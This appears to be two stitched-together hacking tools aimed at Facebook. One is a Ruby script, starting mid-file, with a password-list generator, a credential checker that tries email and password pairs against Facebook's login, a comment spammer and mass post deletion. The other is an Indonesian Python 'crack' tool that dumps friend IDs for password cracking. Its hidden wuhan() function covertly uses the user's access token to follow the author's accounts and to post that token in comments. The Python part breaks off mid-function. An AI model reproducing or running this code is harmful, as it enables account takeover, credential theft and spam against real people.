      password = "%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % [a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k]
      puts ("#{$w}[+] Creating Files...")
      save = a + '.txt'
      File.open(save,'w') do |data|
        tik("#{$w}[+] Pleace Wait....")
        data << password
        100.times{|x_x| data << a + x_x.to_s + "\n"}
        100.times{|x_x| data << i + x_x.to_s + "\n"}
        100.times{|x_x| data << d + x_x.to_s + "\n"}
        100.times{|x_x| data << j + x_x.to_s + "\n"}
      end
      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success "+save)
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '4'
      ok = 0
      cp = 0
      die = 0
      system ('clear')
      puts ($logo)
      puts ("#{$g}[ INFO ] SEPERATOR id | password | Birhday")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] File : ")
      file = gets.chomp!
      if File.file? (file)
        files = File.readlines(file, chomp: true).uniq
        puts ("#{$w}[+] Total #{files.length} Account")
        puts ("#{$w}[+] START...")
        puts ("#{$w}#{'═'*52}")
        for i in files
          sep = i.split('|')
          email = sep[0]
          pass = sep[1]
          uri = URI("https://mbasic.facebook.com/login.php")
          req = Net::HTTP::Post.new(uri)
          req['user-agent'] = $user_agent
          req.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
          log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
          res = log['set-cookie']
          url = log['location']
          puts (url)
         
          if res.include? ('c_user') or url.include? ('save-device')
            ok += 1
            puts ("#{$g}[OK✓] #{email} | #{pass}")
          elsif res.include? ('checkpoint') or url.include? ('checkpoint')
            cp += 1
            puts ("#{$y}[CP+] #{email} | #{pass}")
          else
            die += 1
            puts ("#{$r}[DIE] #{email} | #{pass}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK  : #{ok}")
        puts ("#{$y}[+] Total CP  : #{cp}")
        puts ("#{$r}[!] Total DIE : #{die}")
      else
        puts ("#{$y}[+] File Not Found")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] START...")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/groups?limit=5000")
      if !a.key? ('data')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif a['data'].empty?
        puts ("#{$y}[!] There are no groups in your account")
      else
        b = a['data'].each{|i|
          puts ("#{$g}[✓] Group Name : #{i['name']}")
          puts ("#{$g}[✓] Group Id   : #{i['id']}")
          puts ("#{$w}#{'═'*52}")
        }
        puts ("#{$g}[✓] Total Groups : #{b.length}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] Your Access Token : #{$token}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '7'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("║-> #{$w}1. Enable")
      puts ("║-> #{$w}2. Disable")
      puts ("║-> #{$g}0. Back")
      print ("#{$w}╚═#{$r}▶#{$w}")
      mana = gets.chomp!
      if mana == '1'
        Guard()
      elsif mana == '2'
        Guard(on = false)
      else
        lain()
      end
    when '8'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Video Id : ")
      id = gets.chomp!
      puts ("#{$w}[+] Loading...")
     # puts ("#{$w}#{'═'*52}")
      a = Request("v10.0/#{id}?fields=source,length,from")
      save = "Facebook-#{id}.mp4"
      if a.key? ('source')
        uri = URI(a['source'])
        Net::HTTP.start(uri.hostname,uri.port,:use_ssl => true) do |http|
          puts ("#{$w}[+] Downloading Video From #{a['from']['name']}")
          File.open(save, "wb") {|f|
            http.get(uri) do |str|
              f.write(str)
            end
          }
        end
        size = File.size(save)
        durasi = Time.at(a['length']).utc.strftime("%H:%M:%S")
        puts ("#{$w}[#{$g}✓#{$w}] Download Complete")
        puts ("#{$w}[#{$g}✓#{$w}] File Name : #{File.basename(save)}")
        puts ("#{$w}[#{$g}✓#{$w}] File Size : #{size}")
        puts ("#{$w}[#{$g}✓#{$w}] File Path : #{File.realpath(save)}")
        puts ("#{$w}[#{$g}✓#{$w}] Duration  : #{durasi}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        lain()
      else
        puts ("#{$y}[!] Invalid Video Id ")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        lain()
      end
    when '9'
      PageMenu()
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      lain()
  end
end

def Guard(on = true)
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % [on, $id]
  headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth '+$token}
  uri = URI('https://graph.facebook.com/graphql')
  https = Net::HTTP.new(uri.host,uri.port)
  https.use_ssl = true
  req = Net::HTTP::Post.new(uri.path, headers)
  req.body = data
  res = https.request(req)
  body = res.body
  puts (body)
  if body.include? ('"is_shielded":true')
    puts ("#{$g}[✓] Activated")
  elsif body.include? ('"is_shielded":false')
    puts ("#{$y}[+] Deactivated")
  else
    puts ("#{$r}[!] Error")
  end
  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
  lain()
end

def PageMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Publish a Post")
  puts ("#{$w}║-> 2. Publish a Link")
  puts ("#{$w}║-> 3. Comment Post")
  puts ("#{$w}║-> 4. Spam Comments")
  puts ("#{$w}║-> 5. Delete Post")
  puts ("#{$w}║-> 6. Access Token")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("#{$w}╚═#{$r}▶#{$w}")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
      uri = URI("https://graph.facebook.com/#{id}/feed")
      data = {"message"=>body,"access_token"=>token[0]}
      req = Net::HTTP.post_form(uri,data)
      post = JSON.parse(req.body)
      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      print ("#{$w}[+] Link : ")
      link = gets.chomp!
      body = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
      uri = URI("https://graph.facebook.com/#{id}/feed")
      data = {"message"=>body,"access_token"=>token[0],"link"=>link}
      req = Net::HTTP.post_form(uri,data)
      post = JSON.parse(req.body)
      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '3'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Target Must Be Page")
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Target Id : ")
      target = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      msg = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      puts ("#{$w}[!] CTRL + C TO STOP")
      puts ("#{$w}#{'═'*52}")
      if token.match? ('EAA')
        uri = URI("https://graph.facebook.com/v1.0/#{target}?fields=feed.limit=5000&access_token=#{token}")
        r = Net::HTTP.get(uri)
        a = JSON.parse(r)
        if a.key? ('error')
          puts a
          puts ("#{$y}[!] Target Not Found")
        elsif a['feed']['data'].empty?
          puts ("#{$y}[+] No Posts")
        else
          for i in a['feed']['data']
            begin
              uri = URI("https://graph.facebook.com/#{i['id']}/comments")
              data = {"message"=>msg,"access_token"=>token}
              post = Net::HTTP.post_form(uri,data).body
              res = JSON.parse(post)
              if res.key? ('id')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes -> #{i['id']}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{i['id']}")
              end
            rescue Interrupt
              puts ("\n")
              break
            end
          end
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '4'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp!
      print ("#{$w}[+] Page Post Id : ")
      posts = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      puts ("#{$w}[!] CTRL + C TO STOP")
      puts ("#{$w}#{'═'*52}")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      if token.match? ('EAA')
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{posts}?fields=from&access_token=#{token}"))
        b = JSON.parse(a)
        if b.key? ('from')
          loop do
            begin
              uri = URI("https://graph.facebook.com/#{posts}/comments")
              data = {"message"=>body,"access_token"=>token}
              req = Net::HTTP.post_form(uri,data)
              res = JSON.parse(req.body)
              if res.key? ('id')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
              end
            rescue Interrupt
              break
            end
          end
          puts ("\n#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        else
          puts (b)
          puts ("#{$y}[!] Post Not Found")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '5'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp!
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      if token.match? ('EAA')
        puts ("#{$w}[+] Page Name : #{req['data'][0]['name']}")
        puts ("#{$w}[!] CTRL + C TO STOP")
        puts ("#{$w}#{'═'*52}")
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=feed.limit(5000)&access_token=#{token}"))
        b = JSON.parse(a)
        if b.key? ('error')
          puts (b)
          abort ("#{$r}[!] Error#{$a}")
        elsif !b.key? ('feed')
          puts ("#{$y}[!] No Posts")
        else
          for i in b['feed']['data']
            begin
              posts = i['id']
              uri = URI("https://graph.facebook.com/#{posts}?method=DELETE&access_token=#{token}")
              del = Net::HTTP.get(uri)
              if del.include? ('true')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
              end
            rescue Interrupt
              puts ("\n") ; break
            end
          end
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        end
      else
        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[!] START...")
      puts ("#{$w}#{'═'*52}")
      req = Request("me/accounts?fields=name,access_token")
      if req.key? ('error')
        abort ("#{req}\n#{$r}[!] Error")
      elsif req['data'].empty?
        puts ("#{$y}[!] Your Account Does Not Have a Fan Page")
      else
        for i in req['data']
          puts ("#{$w}[#{$g}✓#{$w}] Page Name : #{i['name']}")
          puts ("#{$w}[#{$g}✓#{$w}] Page Id : #{i['id']}")
          puts ("#{$w}[#{$g}✓#{$w}] Access Token : #{i['access_token']}\n\n")
        end
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        PageMenu()
      end
    when '0'
      lain()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      PageMenu()
  end
end
  

if __FILE__ == $0
  system("printf \"\033]0;Facebook\007\"")
  Masuk()
end#!/usr/bin/python2
# coding=utf-8
# code by Rizal XD
# my facebook ( https://www.facebook.com/RizalXD )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Rizal XD.

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
url = "https://mbasic.facebook.com"
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m  \033[0m|| Created By RizalXD
 \033[0;96m     \033[0m|| Github.com/rizal-XD
 \033[0;96m   \033[0;91mv2.0  \033[0m|| Facebook.com/riza XD.'''

lo_ngentod = '1714009362122228'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
        print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
        print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input(' %s*%s tekan enter '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
    print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
    print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        followers(kontol)
    elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(kontol)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ hasil crack yang tersimpan di file anda ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# Yang ganti bot nya gw sumpahin mak lo mati ajg!
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
